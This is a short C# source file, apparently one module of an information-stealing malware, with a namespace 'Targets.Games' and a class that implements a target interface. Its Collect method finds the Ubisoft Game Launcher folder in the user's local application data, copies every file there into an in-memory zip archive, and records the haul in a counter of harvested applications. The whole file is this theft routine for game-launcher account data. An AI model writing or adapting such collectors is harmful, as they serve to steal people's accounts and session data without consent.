using Helper.Data;
using System;
using System.IO;

namespace Targets.Games
{
	public class Uplay : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");
	    if (!Directory.Exists(str))
	      return;
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
	    counterApplications.Name = nameof (Uplay);
	    zip.AddDirectoryFiles(str, nameof (Uplay));
	    counterApplications.Files.Add(str + " => \\Uplay");
	    counterApplications.Files.Add("Uplay\\");
	    counter.Games.Add(counterApplications);
	  }
	}
}
